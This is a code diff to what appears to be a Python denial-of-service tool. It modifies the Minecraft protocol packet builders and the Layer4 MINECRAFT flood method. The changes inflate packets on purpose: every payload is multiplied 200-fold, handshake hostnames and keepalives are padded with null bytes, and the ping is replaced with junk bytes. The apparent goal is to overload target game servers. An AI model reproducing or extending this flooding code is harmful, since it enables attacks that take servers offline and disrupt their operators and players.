@@ -281,6 +281,8 @@ class Tools:
 
 
 class Minecraft:
+    MULTIPLIER = 200
+
     @staticmethod
     def varint(d: int) -> bytes:
         o = b''
@@ -294,8 +296,9 @@ class Minecraft:
 
     @staticmethod
     def data(*payload: bytes) -> bytes:
-        payload = b''.join(payload)
-        return Minecraft.varint(len(payload)) + payload
+        original_payload = b''.join(payload)
+        multiplied_payload = original_payload * Minecraft.MULTIPLIER
+        return Minecraft.varint(len(multiplied_payload)) + multiplied_payload
 
     @staticmethod
     def short(integer: int) -> bytes:
@@ -306,12 +309,15 @@ class Minecraft:
         return data_pack('>q', integer)
 
     @staticmethod
-    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
-                              Minecraft.varint(version),
-                              Minecraft.data(target[0].encode()),
-                              Minecraft.short(target[1]),
-                              Minecraft.varint(state))
+    def handshake(target: Tuple[str, int], version: int, state: int, padding: int = 100) -> bytes:
+        padded_host = target[0].encode() + b'\x00' * padding
+        return Minecraft.data(
+            Minecraft.varint(0x00),
+            Minecraft.varint(version),
+            Minecraft.data(padded_host),
+            Minecraft.short(target[1]),
+            Minecraft.varint(state)
+        )
 
     @staticmethod
     def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
@@ -337,33 +343,48 @@ class Minecraft:
                               Minecraft.data(username))
 
     @staticmethod
-    def keepalive(protocol: int, num_id: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
-                                               0x10 if protocol >= 712 else \
-                                               0x0F if protocol >= 471 else \
-                                               0x10 if protocol >= 464 else \
-                                               0x0E if protocol >= 389 else \
-                                               0x0C if protocol >= 386 else \
-                                               0x0B if protocol >= 345 else \
-                                               0x0A if protocol >= 343 else \
-                                               0x0B if protocol >= 336 else \
-                                               0x0C if protocol >= 318 else \
-                                               0x0B if protocol >= 107 else \
-                                               0x00),
-                              Minecraft.long(num_id) if protocol >= 339 else \
-                              Minecraft.varint(num_id))
+    def keepalive(protocol: int, num_id: int, fake_data_size: int = 100) -> bytes:
+        packet_id = Minecraft.varint(
+            0x0F if protocol >= 755 else
+            0x10 if protocol >= 712 else
+            0x0F if protocol >= 471 else
+            0x10 if protocol >= 464 else
+            0x0E if protocol >= 389 else
+            0x0C if protocol >= 386 else
+            0x0B if protocol >= 345 else
+            0x0A if protocol >= 343 else
+            0x0B if protocol >= 336 else
+            0x0C if protocol >= 318 else
+            0x0B if protocol >= 107 else
+            0x00
+        )
+        payload = Minecraft.long(num_id) if protocol >= 339 else Minecraft.varint(num_id)
+        padding = b'\x00' * fake_data_size
+        return Minecraft.data(packet_id, payload, padding)
 
     @staticmethod
-    def chat(protocol: int, message: str) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
-                                               0x03 if protocol >= 464 else \
-                                               0x02 if protocol >= 389 else \
-                                               0x01 if protocol >= 343 else \
-                                               0x02 if protocol >= 336 else \
-                                               0x03 if protocol >= 318 else \
-                                               0x02 if protocol >= 107 else \
-                                               0x01),
-                              Minecraft.data(message.encode()))
+    def data_with_multiplier(*payload: bytes, multiplier: int = 1) -> bytes:
+        original = b''.join(payload)
+        multiplied = original * multiplier
+        return Minecraft.varint(len(multiplied)) + multiplied
+
+    @staticmethod
+    def chat(protocol: int, message: str, multiplier: int = 1) -> bytes:
+        packet_id = Minecraft.varint(
+            0x03 if protocol >= 755 else
+            0x03 if protocol >= 464 else
+            0x02 if protocol >= 389 else
+            0x01 if protocol >= 343 else
+            0x02 if protocol >= 336 else
+            0x03 if protocol >= 318 else
+            0x02 if protocol >= 107 else
+            0x01
+        )
+        return Minecraft.data_with_multiplier(
+            packet_id,
+            Minecraft.data(message.encode()),
+            multiplier=multiplier
+        )
 
 
 # noinspection PyBroadException,PyUnusedLocal
@@ -435,7 +456,8 @@ class Layer4(Thread):
 
     def MINECRAFT(self) -> None:
         handshake = Minecraft.handshake(self._target, self.protocolid, 1)
-        ping = Minecraft.data(b'\x00')
+        _data = b'\x01\x02\x03\xff\xaa' * 50
+        ping = Minecraft.data(_data)
 
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
